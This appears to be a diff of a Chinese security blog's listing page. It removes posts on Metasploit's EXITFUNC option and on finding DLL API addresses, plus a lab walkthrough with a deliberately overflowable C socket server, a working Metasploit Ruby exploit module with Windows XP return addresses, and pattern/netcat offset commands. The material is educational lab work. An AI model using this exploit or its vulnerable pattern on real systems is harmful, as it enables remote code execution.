-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/22/tools/关于metasploit的EXITFUNC参数的解释/" itemprop="url">关于metasploit的EXITFUNC参数的解释</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T13:54:52+08:00">
-                2017-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>这个简单的介绍是从Google上搜的，当我们使用metasploit框架时经常会遇到EXITFUNC这个参数，这个参数是干什么用的呢？</p>
-<font color="#f00">EXITFUNC有4个不同的值：none，seh，thread和process。通常它被设置为线程或进程，它对应于ExitThread或ExitProcess调用。 “none”参数将调用GetLastError，实际上是无操作，线程然后将继续执行，允许您简单地将多个有效负载一起串行运行。<br><br>在某些情况下，EXITFUNC是有用的，在利用一个exploit之后，我们需要一个干净地退出 </font>
-
-<h4 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h4><font color="#00f">This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs.</font>
-
-<p>当存在结构化异常处理程序（SEH），且触发该SEH将自动重启线程或进程时，应使用此方法。</p>
-<h4 id="THREAD"><a href="#THREAD" class="headerlink" title="THREAD"></a>THREAD</h4><font color="#00f">This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application/system (clean exit)</font>
-
-<p>此方法用于大多数场景，其中被利用的进程（例如IE）在子线程中运行shellcode并退出此线程会导致正在工作的应用程序/系统（清除退出）。</p>
-<h4 id="PROCESS"><a href="#PROCESS" class="headerlink" title="PROCESS"></a>PROCESS</h4><font color="#00f">This method should be used with multi/handler. This method should also be used with any exploit where a master process restarts it on exit.</font>
-
-<p>此方法应与multi/handler这个利用模块一起使用。此方法也应该与任何主进程在退出时会重新启动的漏洞一起使用。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/0day/查找动态链接库的API地址/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/22/0day/查找动态链接库的API地址/" itemprop="url">查找动态链接库的API地址</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T13:10:12+08:00">
-                2017-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1、开始之前"><a href="#1、开始之前" class="headerlink" title="1、开始之前"></a>1、开始之前</h3><p>为什么要获取动态链接库的API函数地址，这是为了方便测试时得到需要的函数，并通过该函数进行一系列的操作。<br>而为了能够写出shellcode，需要的是这个动态链接库的API函数的地址，因而需要掌握获取API地址的方法。</p>
-<h3 id="2、使用OllyDbg获取动态链接库的API函数地址"><a href="#2、使用OllyDbg获取动态链接库的API函数地址" class="headerlink" title="2、使用OllyDbg获取动态链接库的API函数地址"></a>2、使用OllyDbg获取动态链接库的API函数地址</h3><font color="#0f0">本文以获取动态链接库user32.dll中的MessageBoxA函数地址为例。</font>
-
-<p>（1）首先使用OllyDbg打开一个使用了该动态链接库的PE程序<br>其实包含user32.dll的程序有很多，大致上只要含有图形界面，就需要user32.dll这个动态链接库。<br>我们以windows系统中最为常见的calc.exe为例(calc是计算器程序，很明显有界面；其存放在c:\windows\system32\calc.exe)</p>
-<p>（2）使用OllyDbg的查看可执行模块的功能<br>点击查看-&gt;可执行模块<br>可以看到下面的界面</p>
-<p><img src="/images/2017-06-22/executable.jpg" alt="OllyDbg查看可执行模块"></p>
-<p>（3）点击user32.dll，右键点击查看名称</p>
-<p><img src="/images/2017-06-22/find_name.png" alt="查看动态链接库的API函数"></p>
-<p>（4）找到MessageBoxA，并得到其对应的地址</p>
-<p><img src="/images/2017-06-22/find_address.jpg" alt="找到API函数地址"></p>
-<h3 id="3、使用C32asm获取动态链接库的API函数地址"><a href="#3、使用C32asm获取动态链接库的API函数地址" class="headerlink" title="3、使用C32asm获取动态链接库的API函数地址"></a>3、使用C32asm获取动态链接库的API函数地址</h3><font color="#0f0">【该工具属于吾爱破解工具包=&gt;反编译工具】</font><br>点击 工具-&gt;API地址查询<br><br><img src="/images/2017-06-22/C32asm_API_address.jpg" alt="使用C32asm查询dll的API函数地址"><br><br><font color="#f00">毫无疑问，从简易程度来看，使用C32asm查询的速度更快，而且更为适合用户！！！</font>
-
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/21/tools/使用MSF发布POC/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/21/tools/使用MSF发布POC/" itemprop="url">使用MSF发布POC</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-21T09:44:47+08:00">
-                2017-06-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/tool/" itemprop="url" rel="index">
-                    <span itemprop="name">tool</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1、开始之前"><a href="#1、开始之前" class="headerlink" title="1、开始之前"></a>1、开始之前</h3><p>其实Metasploit一直是我想学习的安全工具，但是由于其功能实在太强大了，如果没有基础就开始使用，难免会有点因噎废食的感觉，所以我在学习《0day安全 软件漏洞分析技术》的过程中，做了些许CTF的逆向题，看了不少该类型题的writeup，最后才开始我的Metasploit学习之旅。</p>
-<h3 id="2、环境要求"><a href="#2、环境要求" class="headerlink" title="2、环境要求"></a>2、环境要求</h3><table>
-<thead>
-<tr>
-<th></th>
-<th style="text-align:left">推荐使用环境</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>攻击者操作系统</td>
-<td style="text-align:left">Kali2.0</td>
-<td>Kali主机上装有MSF，免去我们重新安装MSF的步骤</td>
-</tr>
-<tr>
-<td>靶机操作系统</td>
-<td style="text-align:left">Win XP SP3</td>
-<td>其他的windows操作系统也可以使用，但是exploit覆盖的函数返回地址会发生改变</td>
-</tr>
-<tr>
-<td>靶机编辑器</td>
-<td style="text-align:left">Visual C++ 6.0</td>
-<td>其他编辑器生成的PE文件也可以用于本实验，但是实验细节会发生改变</td>
-</tr>
-<tr>
-<td>编译选项</td>
-<td style="text-align:left">默认编译选项</td>
-<td></td>
-</tr>
-<tr>
-<td>build版本</td>
-<td style="text-align:left">debug</td>
-<td>release版本也可以用于本实验，但是实验细节会发生改变</td>
-</tr>
-</tbody>
-</table>
-<h3 id="3、windows主机上存在漏洞的Server程序"><a href="#3、windows主机上存在漏洞的Server程序" class="headerlink" title="3、windows主机上存在漏洞的Server程序"></a>3、windows主机上存在漏洞的Server程序</h3><pre><code>#include &quot;iostream&quot;
-#include &quot;winsock2.h&quot;
-#pragma comment(lib, &quot;ws2_32.lib&quot;)
-
-using namespace std;
-
-void msg_display(char* buf)
-{
-    char msg[200];
-    strcpy(msg, buf);        //overflow here, copy 0x200 to 200
-    cout&lt;&lt;&quot;*****************************&quot;&lt;&lt;endl;
-    cout&lt;&lt;&quot;received:&quot;&lt;&lt;endl;
-    cout&lt;&lt;msg&lt;&lt;endl;
-}
-
-void main()
-{
-    int sock, msgsock, length, receive_len;
-    struct sockaddr_in sock_server, sock_client;
-    char buf[0x200];        // noticed it is 0x200
-
-    WSADATA wsa;
-    WSAStartup(MAKEWORD(1,1), &amp;wsa);
-    if((sock=socket(AF_INET, SOCK_STREAM, 0))&lt;0)
-    {
-        cout&lt;&lt;sock&lt;&lt;&quot;sock creating error!&quot;&lt;&lt;endl;
-        exit(1);
-    }
-    sock_server.sin_family=AF_INET;
-    sock_server.sin_port=htons(7777);
-    sock_server.sin_addr.s_addr=htonl(INADDR_ANY);
-    if(bind(sock, (struct sockaddr*)&amp;sock_server, sizeof(sock_server)))
-    {
-        cout&lt;&lt;&quot;binding target server 1.0         &quot;&lt;&lt;endl;
-    }
-    cout&lt;&lt;&quot;*****************************************************&quot;&lt;&lt;endl;
-    cout&lt;&lt;&quot;                exploit target server 1.0          &quot;&lt;&lt;endl;
-    cout&lt;&lt;&quot;*****************************************************&quot;&lt;&lt;endl;
-    listen(sock, 4);
-    length = sizeof(struct sockaddr);
-    do{
-        msgsock = accept(sock, (struct sockaddr*)&amp;sock_client, (int *)&amp;length);
-        if(msgsock==-1)
-        {
-            cout&lt;&lt;&quot;accept error!&quot;&lt;&lt;endl;
-            break;
-        }
-        else
-            do
-            {
-                memset(buf, 0, sizeof(buf));
-                if((receive_len=recv(msgsock, buf, sizeof(buf), 0))&lt;0)
-                {
-                    cout&lt;&lt;&quot;reading stream message error!&quot;&lt;&lt;endl;
-                    receive_len = 0;
-                }
-                msg_display(buf);        //trigged the overflow
-            }while(receive_len);
-            closesocket(msgsock);
-    }while(1);
-    WSACleanup();
-}
-</code></pre><h3 id="4、开发exploit"><a href="#4、开发exploit" class="headerlink" title="4、开发exploit"></a>4、开发exploit</h3><h4 id="4-1-Ruby开发exploit的正常结构"><a href="#4-1-Ruby开发exploit的正常结构" class="headerlink" title="4.1 Ruby开发exploit的正常结构"></a>4.1 Ruby开发exploit的正常结构</h4><pre><code>class xxx
-
-     def initialize
-     #定义模块初始化信息。如漏洞使用的操作系统平台、为不同操作系统指明不同的返回地址
-     #指明shellcode中禁止出现的特殊字符、漏洞相关的描述、URL引用、作者信息等
-     end
-
-     def exploit
-     #将填充物、返回地址、shellcode等组织成最终的attack_buffer，并发送
-     end
-
-end
-</code></pre><h4 id="4-2-Ruby开发“傻瓜式”Exploit"><a href="#4-2-Ruby开发“傻瓜式”Exploit" class="headerlink" title="4.2 Ruby开发“傻瓜式”Exploit"></a>4.2 Ruby开发“傻瓜式”Exploit</h4><pre><code>#!/usr/bin/env ruby
-require &apos;msf/core&apos;      # it is similar to &apos;include&apos; in C language
-class Metasploit3 &lt; Msf::Exploit::Remote
-    include Msf::Exploit::Remote::Tcp
-    def initialize(info = {})
-        super(update_info(info,
-            &apos;Name&apos;=&gt;&apos;failwest_test&apos;,
-            &apos;Platform&apos;=&gt;&apos;win&apos;,
-            &apos;Targets&apos; =&gt; [
-                [ &apos;Windows 2000&apos;,{ &apos;Ret&apos; =&gt; 0x77F8948B } ],
-                [ &apos;Windwos xp sp2&apos;,{ &apos;Ret&apos; =&gt; 0x7C914393 } ],
-                [ &apos;Windwos xp sp3&apos;,{ &apos;Ret&apos; =&gt; 0x7c86467b} ],
-                ],
-            &apos;Payload&apos; =&gt; {
-                &apos;Space&apos; =&gt; 300,
-                &apos;BadChars&apos; =&gt; &apos;\x00&apos;,
-                &apos;StackAdjustment&apos; =&gt; -3500,
-                }))
-    end
-
-    def exploit
-        connect
-        attack_buf = &apos;a&apos;*204 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded
-        sock.put(attack_buf)
-        handler
-        disconnect
-    end
-
-end
-</code></pre><p>require指明所需的类库，相当于C语言中的include。所有的MSF模块都需要这句话。<br>运算符&quot;&lt;&quot;在这里表示继承，也就是说，我们所定义的类是由Msf::Exploit::Remote继承而来，可以方便地使用父类的资源。</p>
-<p>在类中只定义了两个方法（函数），一是initialize，另一个是exploit。<br>可见为MSF开发模块的过程其实就是实现这两个方法的过程。<br>initialize方法的实现非常简单，在某种意义上更像是在“填空”。从代码中可以看到，initialize实际上值调用了一个方法update_info来初始化info数据结构。初始化的过程通过一系列hash操作完成。<br>(1) Name模块的名称，MSF通过这个名称来引用本模块<br>(2) Platform模块运行平台，MSF通过这个值来为exploit挑选payload。本例中，该值为&quot;win&quot;，所以MSF只选用windows平台的payload，BSD和Linux的payload将被禁用。<br>(3) Targets可以定义多种操作系统版本中的返回地址，本例中定义了Windows2000、Windows XP SP2、Windows XP SP3三种，跳转指令选用了jmp esp，均来自kernel32.dll。本实验时您可能需要根据实验环境重新确定这个值。<br>(4) Payload对shellcode的要求，如大小和禁止使用的字节等。由于漏洞函数使用strcpy函数，故字符结束符0x00应该被禁用。MSF会根据这里的设置自动选用编码算法对shellcode进行加工以满足测试要求。</p>
-<p>exploit的定义各位简单。<br>需要说明的只有     attack_buf = &#39;a&#39;*204 + [target[&#39;Ret&#39;]].pack(&#39;V&#39;) + payload.encoded<br>首先选用204个字母&#39;a&#39;填充缓冲区。<br>pack(&#39;V&#39;)的作用时把数据按照DWORD逆序。<br>填充了缓冲区和返回地址后，再选上经过编码的shellcode，就得到最终的attack_buf。其中，payload.encoded会在使用时由MSF提示我们手工设置并生成。</p>
-<h4 id="4-3-获取返回地址和覆盖返回地址"><a href="#4-3-获取返回地址和覆盖返回地址" class="headerlink" title="4.3 获取返回地址和覆盖返回地址"></a><font color="#f00">4.3 获取返回地址和覆盖返回地址</font></h4><p>一眼望去，我们仿佛就知道覆盖的函数返回地址是在第200个字节之后，但这是不对的。对于书上给出的exploit，attack_buf = &#39;a&#39;*200 + [target[&#39;Ret&#39;]].pack(&#39;V&#39;) + payload.encoded，但是实验结果并不能复现，所以我们猜测要么是返回地址弄错了，要么就是没有真正覆盖返回地址。</p>
-<h5 id="获取返回地址"><a href="#获取返回地址" class="headerlink" title="获取返回地址"></a>获取返回地址</h5><p>（1）将windows XP sp3中的kernel32.dll(c:\windows\system32\kernel32.dll)拷贝至kali(/root/Desktop/kernel32.dll)系统<br>（2）使用msfpescan查看jmp esp所在的地址。</p>
-<p><img src="/images/2017-06-21/kernel32_jesp.jpg" alt="获取kernel32.dll的jmp esp地址"></p>
-<p>从图中可以看出jmp esp所在的地址就是0x7c86467b</p>
-<h5 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h5><p>如何发现覆盖的是否是返回地址，就需要对地址一个调试工具了。<br>这里可以使用windbg，也可以使用OllyDbg，为了方便就使用windbg。</p>
-<p>（1）首先在windows xp sp2用windbg打开Server服务程序，启动7777端口。<br>（2）在Kali 2.0上生成有序的定长字符串，这儿使用的是msf的工具pattern_create</p>
-<pre><code># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1000 &gt; /root/Desktop/hi.txt
-</code></pre><p>（3）在Kali 2.0上连接Windows xp sp2(ip地址为192.168.124.132)上的Server服务器</p>
-<pre><code># cat /root/Desktop/hi.txt | nc 192.168.124.132 7777
-</code></pre><p>（4）在windows xp sp2上查看被覆盖的地址，可以从eip上查看</p>
-<p><img src="/images/2017-06-21/cover_addr.jpg" alt="覆盖的返回地址"></p>
-<p>（5）在Kali 2.0上使用msf工具pattern_offset获取地址偏移</p>
-<p><img src="/images/2017-06-21/offset.jpg" alt="获取偏移地址"></p>
-<p>所以最终可以确定，当字符串长度大于204个字节的时候，从第204个字节开始，后4个字节覆盖了该函数的返回地址</p>
-<h5 id="综合编写exploit"><a href="#综合编写exploit" class="headerlink" title="综合编写exploit"></a>综合编写exploit</h5><p>综合上述找到的返回地址以及覆盖返回地址时前面需要字符串长度，最后可以得到以下几个部分:</p>
-<pre><code>&apos;Targets&apos; =&gt; [
-                [ &apos;Windows 2000&apos;,{ &apos;Ret&apos; =&gt; 0x77F8948B } ],
-                [ &apos;Windwos xp sp2&apos;,{ &apos;Ret&apos; =&gt; 0x7C914393 } ],
-                [ &apos;Windwos xp sp3&apos;,{ &apos;Ret&apos; =&gt; 0x7c86467b} ],
-                ],
-
-
-attack_buf = &apos;a&apos;*204 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded
-</code></pre><h3 id="5、测试结果"><a href="#5、测试结果" class="headerlink" title="5、测试结果"></a>5、测试结果</h3><p><img src="/images/2017-06-21/test_result.jpg" alt="实验测试结果"></p>
-<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://pan.baidu.com/s/1jIPzHlG" target="_blank" rel="external">《0day安全 软件漏洞分析技术》</a><br><a href="http://www.2cto.com/article/201308/234430.html" target="_blank" rel="external">2012西电网络攻防大赛 溢出第三题 调试笔记</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/20/hexo/hexo通用配置/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Introspelliam">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/20/hexo/hexo通用配置/" itemprop="url">hexo通用配置</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-20T15:26:47+08:00">
-                2017-06-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hexo搭建博客网站/" itemprop="url" rel="index">
-                    <span itemprop="name">Hexo搭建博客网站</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><p>当确定使用Hexo这种静态博客，并使用前面几篇博客所说明的几种安装配置方法之后，基本上自己的博客就已经能够使用了。但是如何解决细节方面的问题呢？这一节就是专门解决这方面问题所开设的博文，博文将会根据自身遇见的问题以及评论者遇到的问题进行汇总整理，不断更新以确保问题能够及时得到解决！</p>
-<h5 id="1-hexo文章中如何插入图片"><a href="#1-hexo文章中如何插入图片" class="headerlink" title="1. hexo文章中如何插入图片"></a>1. hexo文章中如何插入图片</h5><p>解决这个问题前，首先得了解<a href="/2017/06/20/hexo的目录结构/">Hexo的结构</a>。</p>
-<p>可以看出source目录是创建博文所需要的基本文件，那么可想而知图片也应该放到这个文件夹下。</p>
-<p><font color="#f00">使用本地路径</font>：在hexo/source目录下新建一个images文件夹，将图片放入该文件夹下，插入图片时链接即为/images/图片名称。</p>
-<p><font color="#f00">使用微博图床</font>，地址<a href="http://weibotuchuang.sinaapp.com/，将图片拖入区域中，会生成图片的URL，这就是链接地址。" target="_blank" rel="external">http://weibotuchuang.sinaapp.com/，将图片拖入区域中，会生成图片的URL，这就是链接地址。</a></p>
-<p>毫无疑问推荐使用第一种方法，而markdown引用图片的方法：</p>
-<pre><code>![Alt text](/path/to/img.jpg)
-</code></pre><h5 id="2-hexo如何分享"><a href="#2-hexo如何分享" class="headerlink" title="2. hexo如何分享"></a>2. hexo如何分享</h5><p>bluelake主题十分友好的是将这些内容封装起来，用户只需要在themes/bluelake/_config.yml中进行配置即可！</p>
-<p>相关代码是：</p>
-<pre><code>#Share
-baidu_share: ## 百度分享
-JiaThis_share: ##true ##JiaThis分享
-duoshuo_share: #true ##true 多说分享必须和多说评论一起使用。
-addToAny_share: # AddToAny share. Empty list hides. List items are service name at url. For ex: email for &apos;&lt;a href=&quot;https://www.addtoany.com/add_to/email?linkurl=...&apos;
-#  - twitter
-#  - baidu
-#  - facebook
-#  - google_plus
-#  - linkedin
-#  - email
-#  - qzone
-#  - wechat
-#  - sina_weibo
-</code></pre><p>如果想启用百度分享（包括facebook、twitter、linkedin、有道云笔记、印象笔记、微信、QQ空间、sina微薄），就只需要在baidu_share设置为true就行。</p>
-<p>如果想启用JiaThis分享或者多说分享，都是类似的操作，但是问题是这些分享貌似都不可用！</p>
-<p>所以笔者采用的是addToAny_share这种方式，这时候只需要将取消上面的特定注释即可。而如果大家还想添加其他类型的分享，也可以使用下面的办法：<br>首先访问网站<a href="https://www.addtoany.com/share#url=https%3A%2F%2Fwww.addtoany.com%2F" target="_blank" rel="external">https://www.addtoany.com/share#url=https%3A%2F%2Fwww.addtoany.com%2F</a></p>
-<p>然后画面中会出现下列分享位置<br><img src="/images/2017-06-20/share.jpg" alt="分享地址图片"></p>
-<p>点击某个想分享的地址后，页面会出现类似<br><a href="https://www.addtoany.com/add_to/wechat?url=...." target="_blank" rel="external">https://www.addtoany.com/add_to/wechat?url=....</a>.</p>
-<p>大家只需要将add_to/后的名字填到addToAny_share后面即可，注意使用yaml语法，也即空两格，横线，空格，分享名</p>
-
-          
+          IDA的脚本有两种，一种是idc，另一种是IDAPython。
+可以通过File-&gt;Script file；File-&gt;Script command访问IDA的脚本引擎。
+1、IDC语言1.1 IDC变量IDC的3种数据类型：整数（IDA文档使用类型名称long）、字符串和浮点值。当然也
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/18/tools/IDA的调试脚本idc/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2784,7 +1073,7 @@ addToAny_share: # AddToAny share. Empty list hides. List items are service name 
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2845,7 +1134,7 @@ addToAny_share: # AddToAny share. Empty list hides. List items are service name 
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2856,7 +1145,7 @@ addToAny_share: # AddToAny share. Empty list hides. List items are service name 
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
